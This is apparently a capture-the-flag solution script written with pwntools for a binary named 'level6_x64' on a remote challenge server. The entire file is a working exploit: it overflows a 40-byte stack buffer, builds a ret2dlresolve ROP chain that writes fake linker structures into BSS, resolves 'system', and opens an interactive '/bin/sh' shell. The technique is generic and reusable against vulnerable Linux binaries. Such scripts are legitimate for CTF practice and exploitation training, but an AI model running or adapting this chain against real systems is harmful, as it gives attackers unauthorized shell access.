from pwn import *
context(os='linux', arch='amd64',log_level='debug')
# Context settings
context.binary = elf = ELF('level6_x64')
# Replace with the actual IP and Port
# io = process('./challenge') # Test locally first
io = remote('pwn1.0ops.sjtu.cn',11006)

# 1. Setup the Ret2dlresolve Payload
# We want to call 'system' with the argument '/bin/sh'
# We will place our fake structures at an offset in the BSS section
bss_address = elf.bss() + 0x500 

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"], data_addr=bss_address)
# 2. Build the ROP Chain
# First, we call gets(bss_address) to write the payload into memory
rop.gets(dlresolve.data_addr)

# Second, we jump to the dlresolve stub
rop.ret2dlresolve(dlresolve)

# 3. Construct Final Payload
offset = 40 # Based on [32 bytes v1] + [8 bytes RBP]
raw_rop = rop.chain()

payload = flat({
    offset: raw_rop
})

# 4. Execution
# Send the first payload to overflow the stack and start the ROP
io.sendline(payload)

# The ROP is now executing gets(bss_address). 
# We now send the dlresolve structures to be placed in BSS.
io.sendline(dlresolve.payload)

# If successful, we get a shell

io.interactive()
